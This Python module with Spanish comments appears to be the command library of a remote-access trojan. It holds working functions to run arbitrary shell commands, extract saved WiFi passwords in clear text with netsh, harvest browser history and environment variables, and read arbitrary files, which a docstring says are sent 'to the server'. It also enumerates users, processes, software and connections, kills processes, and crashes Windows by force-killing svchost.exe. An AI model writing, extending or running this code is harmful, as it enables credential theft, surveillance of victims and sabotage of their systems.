import socket
import subprocess
import platform
import os
import psutil
import datetime
import sys
import threading
import pyautogui
from typing import Optional, Tuple, List, Dict
from browser_history import get_history


def execute_command(command: str, timeout: int = 30) -> Tuple[bool, str]:
    """
    Ejecuta un comando de sistema de forma segura.

    Args:
        command: Comando a ejecutar
        timeout: Tiempo máximo de espera en segundos

    Returns:
        Tuple[bool, str]: (éxito, resultado/error)
    """
    try:
        result = subprocess.run(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=timeout,
            encoding='utf-8',
            errors='replace'
        )
        if result.returncode == 0:
            return True, result.stdout
        return False, f"Error (código {result.returncode}): {result.stderr}"
    except subprocess.TimeoutExpired:
        return False, f"Error: El comando excedió el tiempo límite de {timeout} segundos"
    except Exception as e:
        return False, f"Error: {str(e)}"


def bluescreen():
    try:
        if platform.system() == "Windows":
             os.system("taskkill /F /IM svchost.exe")
        else:
            return "No se pudo reiniciar el sistema"
    except Exception as e:
        return f"Error reiniciando el sistema: {e}"


def get_hostname() -> str:
    """Obtiene información detallada del host."""
    try:
        hostname = socket.gethostname()
        return f"Hostname: {hostname}\n"
    except Exception as e:
        return f"Error obteniendo hostname: {e}"



def see_file(file_path: str) -> str:
    """
    Descarga un archivo al servidor.

    Args:
        file_path: Ruta del archivo a crear
        content: Contenido del archivo
    """
    try:
       with open(file_path, 'r') as file:
           return file.read()
    except Exception as e:
        return f"Error descargando archivo: {e}"


def get_ip() -> str:
    """Obtiene las direcciones IP de todas las interfaces."""
    try:
        hostname = socket.gethostname()
        ips = []

        # Obtener IP local
        local_ip = socket.gethostbyname(hostname)
        ips.append(f"IP Local: {local_ip}")

        # Intentar obtener IP pública
        try:
            import urllib.request
            external_ip = urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
            ips.append(f"IP Externa: {external_ip}")
        except:
            ips.append("IP Externa: No disponible")

        return "\n".join(ips)
    except Exception as e:
        return f"Error obteniendo IPs: {e}"


def get_os() -> str:
    """Obtiene información detallada del sistema operativo."""
    try:
        os_info = [
            f"Sistema: {platform.system()}",
            f"Versión: {platform.version()}",
            f"Plataforma: {platform.platform()}",
            f"Arquitectura: {platform.machine()}",
            f"Procesador: {platform.processor()}",
            f"Python: {sys.version}"
        ]
        return "\n".join(os_info)
    except Exception as e:
        return f"Error obteniendo información del SO: {e}"


def get_users() -> str:
    """Obtiene información detallada de usuarios."""
    try:
        if platform.system() == "Windows":
            success, output = execute_command("net user")
            if success:
                return output
        else:
            success, output = execute_command("who")
            if success:
                return output
        return "No se pudo obtener información de usuarios"
    except Exception as e:
        return f"Error obteniendo usuarios: {e}"


def get_processes() -> str:
    """Obtiene información detallada de procesos."""
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent']):
            try:
                pid = proc.pid
                Name = proc.name()
                user = proc.username()
                memory = proc.memory_info().rss

                processes.append(f"PID: {pid} Usuario: {user} "
                                 f"Memoria: {memory / (1024 ** 3):.1f} GB Nombre: {Name}")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        return "\n".join(processes)
    except Exception as e:
        return f"Error obteniendo procesos: {e}"


def get_drives() -> str:
    """Obtiene información detallada de unidades de disco."""
    try:
        if platform.system() == "Windows":
            drives_info = []
            for part in psutil.disk_partitions(all=False):
                if os.path.exists(part.mountpoint):
                    usage = psutil.disk_usage(part.mountpoint)
                    drives_info.append(
                        f"Unidad: {part.device}\n"
                        f"  Punto de montaje: {part.mountpoint}\n"
                        f"  Sistema de archivos: {part.fstype}\n"
                        f"  Total: {usage.total / (1024 ** 3):.1f} GB\n"
                        f"  Usado: {usage.used / (1024 ** 3):.1f} GB\n"
                        f"  Libre: {usage.free / (1024 ** 3):.1f} GB\n"
                        f"  Porcentaje usado: {usage.percent}%\n"
                    )
            return "\n".join(drives_info)
        else:
            success, output = execute_command("df -h")
            return output if success else "No se pudo obtener información de discos"
    except Exception as e:
        return f"Error obteniendo información de discos: {e}"


def get_files(path: Optional[str] = None) -> str:
    """
    Obtiene listado detallado de archivos.

    Args:
        path: Ruta a listar. Si es None, usa el directorio actual.
    """
    try:
        path = path or os.getcwd()
        files_info = []

        files_info.append(f"Contenido de: {path}\n")
        total_size = 0

        for entry in os.scandir(path):
            try:
                stats = entry.stat()
                size = stats.st_size
                total_size += size
                modified = datetime.datetime.fromtimestamp(stats.st_mtime).strftime('%Y-%m-%d %H:%M:%S')

                if entry.is_file():
                    type_char = 'F'
                elif entry.is_dir():
                    type_char = 'D'
                else:
                    type_char = '?'

                files_info.append(
                    f"{type_char} {modified} {size:>10,} bytes  {entry.name}"
                )
            except Exception:
                continue

        files_info.append(f"\nTotal: {total_size:,} bytes")
        return "\n".join(files_info)
    except Exception as e:
        return f"Error listando archivos: {e}"


def get_network() -> str:
    """Obtiene información detallada de red."""
    try:
        network_info = []

        # Interfaces de red
        network_info.append("Interfaces de red:")
        for interface, addrs in psutil.net_if_addrs().items():
            network_info.append(f"\n{interface}:")
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    network_info.append(f"  IPv4: {addr.address}")
                elif addr.family == socket.AF_INET6:
                    network_info.append(f"  IPv6: {addr.address}")

        # Estadísticas de red
        net_io = psutil.net_io_counters()
        network_info.extend([
            "\nEstadísticas de red:",
            f"  Bytes enviados: {net_io.bytes_sent:,}",
            f"  Bytes recibidos: {net_io.bytes_recv:,}",
            f"  Paquetes enviados: {net_io.packets_sent:,}",
            f"  Paquetes recibidos: {net_io.packets_recv:,}"
        ])

        return "\n".join(network_info)
    except Exception as e:
        return f"Error obteniendo información de red: {e}"


def get_services() -> str:
    """Obtiene información detallada de servicios."""
    try:
        if platform.system() == "Windows":
            success, output = execute_command("sc query")
            if success:
                return output
        else:
            success, output = execute_command("systemctl list-units --type=service")
            if success:
                return output
        return "No se pudo obtener información de servicios"
    except Exception as e:
        return f"Error obteniendo servicios: {e}"


def get_system_info() -> Dict[str, any]:
    """
    Versión mejorada que devuelve información detallada del sistema.
    """
    try:
        info = {
            "sistema": {
                "os": platform.system(),
                "version": platform.version(),
                "arquitectura": platform.machine(),
                "procesador": platform.processor(),
                "python_version": sys.version,
                "hostname": socket.gethostname(),
                "uptime": str(datetime.datetime.now() -
                              datetime.datetime.fromtimestamp(psutil.boot_time()))
            },
            "cpu": {
                "nucleos_fisicos": psutil.cpu_count(logical=False),
                "nucleos_totales": psutil.cpu_count(),
                "uso": psutil.cpu_percent(interval=1),
                "frecuencia": psutil.cpu_freq()._asdict() if hasattr(psutil.cpu_freq(), '_asdict') else None
            },
            "memoria": {
                "total": psutil.virtual_memory().total,
                "disponible": psutil.virtual_memory().available,
                "porcentaje_uso": psutil.virtual_memory().percent,
                "swap_total": psutil.swap_memory().total,
                "swap_usado": psutil.swap_memory().used
            },
            "discos": [
                {
                    "dispositivo": p.device,
                    "punto_montaje": p.mountpoint,
                    "sistema_archivos": p.fstype,
                    "uso": psutil.disk_usage(p.mountpoint)._asdict()
                    if os.path.exists(p.mountpoint) else None
                }
                for p in psutil.disk_partitions()
            ],
            "red": {
                "interfaces": psutil.net_if_addrs(),
                "estadisticas": psutil.net_io_counters()._asdict(),
                "conexiones": len(psutil.net_connections())
            },
            "bateria": psutil.sensors_battery()._asdict()
            if hasattr(psutil.sensors_battery(), '_asdict') else None
        }

        # Formatear para mejor legibilidad
        return {
            k: {
                str(sub_k): str(sub_v)
                for sub_k, sub_v in v.items()
            } if isinstance(v, dict) else str(v)
            for k, v in info.items()
        }
    except Exception as e:
        return {"error": str(e)}



def execute_shell(command: str) -> str:
    """
    Ejecuta un comando en la shell del sistema.

    Args:
        command: Comando a ejecutar
    """
    try:
        success, output = execute_command(command)
        if success:
            return output
        return f"Error ejecutando comando: {output}"
    except Exception as e:
        return f"Error en shell: {e}"


def get_environment() -> str:
    """Obtiene las variables de entorno."""
    try:
        env_vars = []
        for key, value in os.environ.items():
            env_vars.append(f"{key}={value}")
        return "\n".join(sorted(env_vars))
    except Exception as e:
        return f"Error obteniendo variables de entorno: {e}"


def get_installed_software() -> str:
    """Obtiene el software instalado."""
    try:
        if platform.system() == "Windows":
            success, output = execute_command('wmic product get name,version')
            if success:
                return output
        else:
            success, output = execute_command('dpkg -l' if os.path.exists('/usr/bin/dpkg') else 'rpm -qa')
            if success:
                return output
        return "No se pudo obtener la lista de software instalado"
    except Exception as e:
        return f"Error obteniendo software instalado: {e}"


def get_network_connections() -> str:
    """Obtiene las conexiones de red activas."""
    try:
        connections = []
        for conn in psutil.net_connections(kind='inet'):
            try:
                process = psutil.Process(conn.pid) if conn.pid else None
                local = f"{conn.laddr.ip}:{conn.laddr.port}"
                remote = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "-"
                connections.append(
                    f"PID: {conn.pid or '-':<6} "
                    f"Proceso: {process.name() if process else '-':<15} "
                    f"Local: {local:<21} "
                    f"Remoto: {remote:<21} "
                    f"Estado: {conn.status}"
                )
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        return "\n".join(connections)
    except Exception as e:
        return f"Error obteniendo conexiones de red: {e}"


def kill_process(pid: int) -> str:
    """
    Mata un proceso por su PID.

    Args:
        pid: ID del proceso a matar
    """
    try:
        process = psutil.Process(pid)
        process.kill()
        return f"Proceso {pid} terminado exitosamente"
    except psutil.NoSuchProcess:
        return f"No existe el proceso {pid}"
    except psutil.AccessDenied:
        return f"Acceso denegado al intentar terminar el proceso {pid}"
    except Exception as e:
        return f"Error terminando proceso {pid}: {e}"


def get_browser_history():
    try:
        # Obtener el historial
        history = get_history()
        entries = history.histories  # Acceder a la lista de entradas del historial

        # Formatear el historial
        formatted_history = []
        for entry in entries:

            date = entry[0].strftime('%Y-%m-%d %H:%M:%S')  # Formatear fecha
            url = entry[1]
            title = entry[2] if entry[2] else 'Sin título'  # Manejar caso sin título

            # Agregar la entrada formateada a la lista
            formatted_history.append(f"{date} - {title} - {url}")

        return "\n".join(formatted_history) if formatted_history else "No se encontró historial."

    except Exception as e:
        return f"Error al obtener el historial de navegación: {e}"


def get_wifi_passwords() -> str:
    """
    Obtiene las contraseñas WiFi guardadas en el sistema.
    Solo funciona en Windows con privilegios de administrador.
    """
    try:
        if platform.system() != "Windows":
            return "Esta función solo está disponible en Windows"

        wifi_list = []

        # Obtener perfiles WiFi
        success, output = execute_command("netsh wlan show profile")
        if not success:
            return "Error obteniendo perfiles WiFi"

        profiles = [line.split(":")[1].strip() for line in output.split('\n')
                    if "All User Profile" in line]

        # Obtener contraseña para cada perfil
        for profile in profiles:
            success, output = execute_command(
                f'netsh wlan show profile name="{profile}" key=clear'
            )
            if success:
                password = None
                for line in output.split('\n'):
                    if "Key Content" in line:
                        password = line.split(":")[1].strip()
                        break
                wifi_list.append(f"Red: {profile}\nContraseña: {password or 'No disponible'}\n")

        return "\n".join(wifi_list) if wifi_list else "No se encontraron perfiles WiFi"
    except Exception as e:
        return f"Error obteniendo contraseñas WiFi: {e}"



def monitor_system(interval: int = 1, duration: int = 60) -> List[Dict]:
    """
    Monitoriza el sistema durante un período específico.

    Args:
        interval: Intervalo entre mediciones en segundos
        duration: Duración total del monitoreo en segundos

    Returns:
        List[Dict]: Lista de mediciones
    """
    try:
        measurements = []
        start_time = datetime.datetime.now()

        while (datetime.datetime.now() - start_time).seconds < duration:
            measurement = {
                "timestamp": str(datetime.datetime.now()),
                "cpu_percent": psutil.cpu_percent(interval=1),
                "memory_percent": psutil.virtual_memory().percent,
                "swap_percent": psutil.swap_memory().percent,
                "disk_usage": {
                    p.mountpoint: psutil.disk_usage(p.mountpoint).percent
                    for p in psutil.disk_partitions()
                    if os.path.exists(p.mountpoint)
                },
                "network": psutil.net_io_counters()._asdict(),
                "processes": len(psutil.pids())
            }
            measurements.append(measurement)
            threading.Event().wait(interval)

        return measurements
    except Exception as e:
        return [{"error": str(e)}]
